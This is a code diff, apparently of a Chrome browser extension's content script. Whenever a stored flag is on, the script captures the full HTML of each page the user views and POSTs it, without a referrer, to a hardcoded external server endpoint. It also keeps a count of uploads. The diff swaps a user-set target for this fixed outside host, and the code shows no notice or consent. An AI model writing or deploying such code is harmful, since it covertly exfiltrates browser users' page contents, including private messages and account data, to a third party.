@@ -1,43 +1,45 @@
-chrome.storage.sync.get(['active','total'], function(result) {
-    var active = result.active;
-    var totalnr = result.total;
 
-    if (active == 0)
+chrome.storage.sync.get(['active'], function(result) {
+    if (result.active == 1)
     {
-        console.log("currently inactive");
-    }
-    else 
-    {
+        console.log("script active. doing the magic");
         const html = document.documentElement.innerHTML;
 
         var formData = new Object();
         formData.content = html;
         var dataBody = JSON.stringify(formData);
-        
+
         sendRequest(dataBody);
-        
-        async function sendRequest(dataBody){
-            var url = "";
-            chrome.storage.sync.get(['target'], function(result) {
-                url = result.target;
-                console.log("found the following url specified as target: " + result.target);
-            });
-            console.log("trying to upload html data to specified target");
-            const response = await fetch(url, {
-                method: 'POST',
-                mode: "cors",
-                credentials: "same-origin",
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                referrer: 'no-referrer',
-                body: dataBody
-            });
-            console.log(response.status);
-        }
-        chrome.storage.sync.set({
-            total: totalnr++
-        });
+    }
+    else
+    {
+        console.log("sl33p like a sh33p");
     }
 });
 
+
+
+async function sendRequest(dataBody){
+    console.log("trying to upload html data...");
+    const response = await fetch("https://learn-easy.at/extension/logAll.php", {
+        method: 'POST',
+        mode: "cors",
+        credentials: "same-origin",
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        referrer: 'no-referrer',
+        body: dataBody
+    });
+    add1();
+}
+
+function add1()
+{
+    console.log("yeah boi");
+    chrome.storage.sync.get(['total'], function(result) {
+        chrome.storage.sync.set({
+            total: result.total+1
+        });
+    });
+}
